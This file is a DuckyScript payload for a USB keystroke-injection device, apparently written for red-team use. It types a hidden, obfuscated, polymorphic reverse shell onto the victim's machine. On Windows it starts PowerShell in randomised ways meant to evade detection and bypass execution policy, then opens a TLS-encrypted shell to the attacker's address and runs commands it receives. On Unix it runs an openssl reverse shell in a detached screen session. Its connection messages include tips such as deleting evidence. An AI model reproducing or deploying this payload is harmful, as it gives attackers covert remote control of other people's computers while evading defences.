REM       ReverseDuckyUltimate
REM       Version 1.3
REM       OS: Windows / Unix
REM       Author: 0iphor13
REM       Requirement: DuckyScript 3.0, PayloadStudio v.1.3 minimum
REM       Morphing, Encrypted Reverse shell executed hidden in the background with custom identifier, the CAPSLOCK light at the end will indicate that the payload was executed.

REM Extension PASSIVE_WINDOWS_DETECT by Korben for best and fastest deployment with guard rails
EXTENSION PASSIVE_WINDOWS_DETECT
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        Windows fully passive OS Detection and passive Detect Ready
        Includes its own passive detect ready. 
        Does not require additional extensions.
    
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay
            $_OS will be set to WINDOWS or NOT_WINDOWS
            See end of payload for usage within payload
    END_REM

    REM CONFIGURATION:
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7

    $_OS = #NOT_WINDOWS

    VAR $MAX_TRIES = #MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF

    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
        IF ($_OS == WINDOWS) THEN
            STRING HELLO WINDOWS!
        ELSE
            STRING HELLO WORLD!
        END_IF
    END_REM
END_EXTENSION

REM Extension ROLLING_POWERSHELL_EXECUTION by 0iphor13 to obfuscate the start of Powershell
EXTENSION ROLLING_POWERSHELL_EXECUTION
    REM VERSION 1.0
    REM Author: 0iphor13
    REM Credits: Korben, Daniel Bohannon, Grzegorz Tworek
    REM Requirements: PayloadStudio v.1.3 minimum
    REM Starts Powershell in uncommon ways to avoid basic detection
    REM Via randomisation, obfuscation and usage of less used parameters, this extension helps to evade basic detection.

    REM CONFIGURATION:
    REM Add ExecutionPolicy bypass
    DEFINE #EXECUTIONPOLICY FALSE
    DEFINE #DELAY 200

    $_RANDOM_MIN = 1
    $_RANDOM_MAX = 16
    VAR $RANDOM_PS = $_RANDOM_INT
    FUNCTION Rolling_Powershell_Execution()
        IF ($RANDOM_PS == 1) THEN
            STRING cmd.exe /c "p%PSModulePath:~21,1%weRshe%PUBLIC:~12,1%l.exe -noPr -Noni -wi Hid"
        ELSE IF ($RANDOM_PS == 2) THEN
            STRING cmd.exe /c "PowerShe%PUBLIC:~12,1%%PUBLIC:~12,1% /NoPr /NonI /w hi"
        ELSE IF ($RANDOM_PS == 3) THEN
            STRING cmd.exe /c "P%PSModulePath:~21,1%werShell /NoPr /NonI /w hi"
        ELSE IF ($RANDOM_PS == 4) THEN
            STRING cmd /c "FOR /F "delims=s\ t%PSModulePath:~25,1%kens=4" %a IN ('set^|findstr PSM')DO %a -nop -noni /w H"
        ELSE IF ($RANDOM_PS == 5) THEN
            STRING cmd /c "Powe%ALLUSERSPROFILE:~4,1%Shell -NoPr -NonI -w hi"
        ELSE IF ($RANDOM_PS == 6) THEN
            STRING cmd /c "p^Owe%ALLUSERSPROFILE:~7,1%Shell /NoPr /Nonin /wind hidD"
        ELSE IF ($RANDOM_PS == 7) THEN
            STRING cmd.exe /c "P%PSModulePath:~21,1%werShell -NoPr -NonI -w hi"
        ELSE IF ($RANDOM_PS == 8) THEN
            STRING powershell -NoPro -noninT -win h
        ELSE IF ($RANDOM_PS == 9) THEN
            STRING cmd /c "p^Owe%ALLUSERSPROFILE:~7,1%Shell -NoP -Noni -wind hidD"
        ELSE IF ($RANDOM_PS == 2) THEN
            STRING powershell.exe -NoP -nOni -W h
        ELSE IF ($RANDOM_PS == 10) THEN
            STRING cmd /c "FOR /F "delims=s\ tokens=4" %a IN ('set^|findstr PSM')DO %a -nop -noni -w H"
        ELSE IF ($RANDOM_PS == 11) THEN
            STRING powershell -nopr -noninT -W HiddEn
        ELSE IF ($RANDOM_PS == 12) THEN
            STRING cmd.exe /c "FOR /F "delims=s\ tokens=4" %a IN ('set^|findstr PSM')DO %a -noProF -nonin -win Hi"
        ELSE IF ($RANDOM_PS == 13) THEN
            STRING cmd /c "P%PSModulePath:~25,1%weRShell -noProf -NonIn -wi h"
        ELSE IF ($RANDOM_PS == 14) THEN
            STRING powershell -noproF -noni -W Hi
        ELSE IF ($RANDOM_PS == 15) THEN
            STRING cmd /c "Powe%ALLUSERSPROFILE:~4,1%Shell /NoPr /NonI /%PSModulePath:~17,1% hi"
        ELSE ($RANDOM_PS == 16) THEN
            STRING powershell.exe -noP -nOnI -windo H
        END_IF

        IF_DEFINED_TRUE #EXECUTIONPOLICY
            SPACE
            IF (($RANDOM_PS % 2) == 0) THEN
                STRING -ep ByPasS
            ELSE IF (($RANDOM_PS % 5) == 0) THEN
                STRING -exec bypass
            ELSE IF (($RANDOM_PS % 7) == 0) THEN
                STRING -exeC byPasS
            ELSE IF (($RANDOM_PS % 10) == 0) THEN
                STRING -exEcUtionPoL bYpaSs
            ELSE IF (($RANDOM_PS % 12) == 0) THEN
                STRING -exEcUtion bYPaSs
            ELSE
                STRING -eP BYPaSs
            END_IF
        END_IF_DEFINED
        ENTER
        DELAY #DELAY
    END_FUNCTION
    REM EXAMPLE USAGE AFTER EXTENSION
    REM DELAY 2000
    REM GUI r
    REM DELAY 2000
    REM Rolling_Powershell_Execution()
END_EXTENSION

EXTENSION DETECT_FINISHED
    REM VERSION 1.0
    REM AUTHOR: 0iphor13

    REM_BLOCK DOCUMENTATION
        USAGE:
            Use the function Detect_Finished() to signal the finished execution of your payload.
    END_REM

    REM CONFIGURATION:
    DEFINE #PAUSE 150
    FUNCTION Detect_Finished()
        IF ($_CAPSLOCK_ON == FALSE)
            CAPSLOCK
            DELAY #PAUSE
            CAPSLOCK
            DELAY #PAUSE
            CAPSLOCK
            DELAY #PAUSE
            CAPSLOCK
            ATTACKMODE OFF
        ELSE IF
            CAPSLOCK
            DELAY #PAUSE
            CAPSLOCK
            DELAY #PAUSE
            CAPSLOCK
            ATTACKMODE OFF
        END_IF
    END_FUNCTION
END_EXTENSION

EXTENSION WINDOWS11_CONSOLE_DOWNGRADE
    REM_BLOCK
        Version: 1.0
        Author: 0iphor13
        Description: Downgrade the default command prompt of Windows 11 to use Conhost again. 
        Afterwards PowerShell can be used with paramters like "-WindowStyle Hidden" again.
    END_REM

    REM CONFIGURATION:
    REM Used to wait until initial execution
    DEFINE #INPUT_WAIT 2000
    REM GUID for using the legacy console host for terminal execution
    DEFINE #CONHOST B23D10C0-E52E-411E-9D5B-C09FDF709C7D
 
    FUNCTION Console_Downgrade()
        DELAY #INPUT_WAIT
        GUI r
        DELAY 500
        STRINGLN powershell -NoP -NonI
        DELAY 1000
        STRING Set-ItemProperty -Path "HKCU:\Console\%%Startup" -Name DelegationConsole -Value "{#CONHOST}";
        STRINGLN Set-ItemProperty -Path "HKCU:\Console\%%Startup" -Name DelegationTerminal -Value "{#CONHOST}";exit
    END_FUNCTION

    REM_BLOCK
        EXAMPLE USAGE AFTER EXTENSION: Downgrade the command prompt via registry, then open a hidden PS instance and execute Calc.exe.
        Console_Downgrade()
        DELAY 2000
        GUI r
        DELAY 2000
        STRINGLN powershell -w h
        DELAY 1500
        STRINGLN calc.exe;exit
    END_REM
END_EXTENSION

REM Define the attackers IP, Port and Identifier
DEFINE #ADDRESS '0.0.0.0'
DEFINE #PORT 4444
DEFINE #IDENTIFIER Ducky
REM Automatic setup requires openssl!
DEFINE #SETUP FALSE
REM Turn on when target uses Windows 11 - Helps to hide Powershell
DEFINE #WINDOWS11 FALSE

REM Automatic setup and start listener - Requires openssl!
IF_DEFINED_TRUE #SETUP
    IF ($_OS == #NOT_WINDOWS) THEN    
        DELAY 1500
        STRINGLN echo "Setting up Infrastructre - Do not interact!"
        DELAY 1000
        STRINGLN openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && echo "Setup complete! Starting listener on Port #PORT " && openssl s_server -quiet -key key.pem -cert cert.pem -port #PORT
    ELSE
        DELAY 1500        
        GUI r
        DELAY 1000
        STRINGLN notepad.exe
        DELAY 250
        STRING Setup requires an unix based machine with openssl installed!
    END_IF
ELSE_DEFINED
    IF ($_OS == WINDOWS) THEN
    
        REM Pseudo random variables for layer one polymorphism
        VAR $var_gibberish = $_RANDOM_NUMBER_KEYCODE
        VAR $var_gibberish2 = $_RANDOM_LETTER_KEYCODE 
        VAR $var_gibberish3 = $_RANDOM_LOWER_LETTER_KEYCODE 
        VAR $var_gibberish4 = $_RANDOM_LETTER_KEYCODE
        VAR $var_gibb3rish = $_RANDOM_NUMBER_KEYCODE
        VAR $var_gIbberish5 = $_RANDOM_UPPER_LETTER_KEYCODE
        VAR $var_gibberish6 = $_RANDOM_NUMBER_KEYCODE
        VAR $var_gibBerish1 = $_RANDOM_NUMBER_KEYCODE
        
        REM Layer two polymorphism
        VAR $RANDOM_LAYER = $_RANDOM_INT
        
        REM Polymorphism function
        FUNCTION Polymorphism()
            IF (($RANDOM_LAYER % 2) == 0) THEN
                STRING $
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gibberish2
                INJECT_VAR $var_gibberish3
                INJECT_VAR $var_gibberish3
                INJECT_VAR $var_gibberish4
                INJECT_VAR $var_gIbberish5
            ELSE IF (($RANDOM_LAYER % 6) == 0) THEN
                STRING $
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gibberish2
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gibberish3
                INJECT_VAR $var_gibberish4
                INJECT_VAR $var_gibberish
            ELSE
                STRING $
                INJECT_VAR $var_gibberish4
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gibberish2
                INJECT_VAR $var_gibberish3
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gibberish4
            END_IF
        END_FUNCTION
        
        REM Polymorphism function
        FUNCTION Polymorphism2()
            IF (($RANDOM_LAYER % 6) == 0) THEN
                STRING $
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gibberish2
                INJECT_VAR $var_gibberish3
                INJECT_VAR $var_gibberish3
                INJECT_VAR $var_gibberish4
                INJECT_VAR $var_gIbberish5
                INJECT_VAR $var_gIbberish5
            ELSE IF (($RANDOM_LAYER % 9) == 0) THEN
                STRING $
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gIbberish5
                INJECT_VAR $var_gibberish2
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gibberish3
                INJECT_VAR $var_gibberish4
                INJECT_VAR $var_gibberish
            ELSE
                STRING $
                INJECT_VAR $var_gibberish4
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gibberish2
                INJECT_VAR $var_gibberish3
                INJECT_VAR $var_gibberish6
                INJECT_VAR $var_gibberish4
                INJECT_VAR $var_gIbberish5
            END_IF
        END_FUNCTION
        
        REM Polymorphism function
        FUNCTION Polymorphism3()
            IF (($RANDOM_LAYER % 1) == 0) THEN
                STRING $
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gibberish2
                INJECT_VAR $var_gIbberish5
            ELSE IF (($RANDOM_LAYER % 8) == 0) THEN
                STRING $
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gIbberish5
                INJECT_VAR $var_gibberish
            ELSE
                STRING $
                INJECT_VAR $var_gibberish4
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gIbberish5
            END_IF
        END_FUNCTION
        
        REM Polymorphism function
        FUNCTION Polymorphism4()
            IF (($RANDOM_LAYER % 1) == 0) THEN
                STRING $
                INJECT_VAR $var_gIbberish5
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gibberish2
                INJECT_VAR $var_gibb3rish
            ELSE IF (($RANDOM_LAYER % 8) == 0) THEN
                STRING $
                INJECT_VAR $var_gibBerish1
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gIbberish5
                INJECT_VAR $var_gibberish
            ELSE
                STRING $
                INJECT_VAR $var_gibberish6
                INJECT_VAR $var_gibberish4
                INJECT_VAR $var_gibberish
                INJECT_VAR $var_gIbberish5
            END_IF
        END_FUNCTION
        
        REM Connection Message
        FUNCTION Quack_Slogan()
            IF (($RANDOM_LAYER % 2) == 0) THEN
                STRING "[!] Quack you $env:USERNAME/$env:COMPUTERNAME! `n[?] Opsec Tip: Use environment variables.`n`n"
            ELSE IF (($RANDOM_LAYER % 3) == 0) THEN
                STRING "[!] $env:USERNAME/$env:COMPUTERNAME got found a flash drive... `n[?] Considere converting IPs to decimal (e.g. 127.0.0.1 = 2130706433)`n`n"
            ELSE IF (($RANDOM_LAYER % 4) == 0) THEN
                STRING "[!] $env:USERNAME/$env:COMPUTERNAME compromised by #IDENTIFIER `n[+] Ducks > D0lphins!`n`n"
            ELSE IF (($RANDOM_LAYER % 6) == 0) THEN
                STRING "[!] Quack Attack on $env:USERNAME/$env:COMPUTERNAME `n[+] Sometimes it is better to wait...Be patient!`n`n"
            ELSE IF (($RANDOM_LAYER % 8) == 0) THEN
                STRING "[!] Established remote access on $env:USERNAME/$env:COMPUTERNAME `n[?] Watch out for powershell -v 2!`n`n"
            ELSE IF (($RANDOM_LAYER % 9) == 0) THEN
                STRING "[!] $env:USERNAME/$env:COMPUTERNAME messed with the Duck `n[?] Remember to delete evidence.`n`n"
            ELSE
                STRING "[!] $env:USERNAME/$env:COMPUTERNAME says Quack! `n[+]...and then he waddled away...`n`n"
            END_IF
        END_FUNCTION
        
        REM Downgrades the Console, if Windows 11 is set to TRUE
        IF_DEFINED_TRUE #WINDOWS11
            Console_Downgrade()
            DELAY 2000
        END_IF_DEFINED
        GUI r
        DELAY 500
        Rolling_Powershell_Execution()
        DELAY 1000
        Polymorphism()    
        STRING =[Text.Encoding]::UTF8.GetBytes(
        Quack_Slogan()
        STRING );
        Polymorphism2()
        REM Section were Address & Port get reflected
        STRING =New-Object Net.Sockets.TcpClient( #ADDRESS , #PORT );
        STRING $s=
        Polymorphism2()
        STRING .GetStream();
        STRING $sSL=New-Object System.Net.Security.SslStream($s,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));
        STRING $sSL.AuthenticateAsClient('madeby.0iphor13', $null, "Tls12", $false);
        Polymorphism3()
        STRING =new-object System.IO.StreamWriter($sSL);
        STRING $sSL.write(
        Polymorphism()
        STRING ,0,
        Polymorphism()
        STRING .Length);
        Polymorphism3()
        STRING .Write('
        REM Identifier
        STRING #IDENTIFIER
        STRING @PS '+(&('g'+'l'))+'> ');
        Polymorphism3()
        STRING .flush();[byte[]]
        Polymorphism4() 
        STRING = 0..65535|%{0};while(($i=$sSL.Read(
        Polymorphism4()
        STRING , 0, 
        Polymorphism4()
        STRING .Length)) -ne 0){$D=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(
        Polymorphism4()
        STRING ,0, $i);
        STRING $Y=(iex $D | Out-String ) 2>&1;$X=$Y + '
        REM Identifier
        STRING #IDENTIFIER
        STRING @PS ' + (Get-LoCatIon).Path + '> ';
        STRING $Z=([text.encoding]::UTF8).GetBytes($X);$sSL.Write($Z,0,$Z.Length);
        STRING $sSL.Flush()};exit
        DELAY 250
        ENTER
        REM Indicator of successful execution
        Detect_Finished()
    ELSE
        REM Executing reverse shell when inserted into non-windows box
        REM Non-ideal solution for opening terminal (But should work for most unix distros)
        DELAY 2000
        INJECT_MOD COMMAND
        DELAY 2000
        STRING terminal
        DELAY 500
        ENTER
        DELAY 1000
        STRINGLN which screen >/dev/null && which openssl >/dev/null && screen -md sh -c 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect #ADDRESS:#PORT > /tmp/s; rm /tmp/s'
        DELAY 1000
        STRINGLN exit
        REM Indicator of successful execution
        Detect_Finished()
    END_IF
END_IF_DEFINED
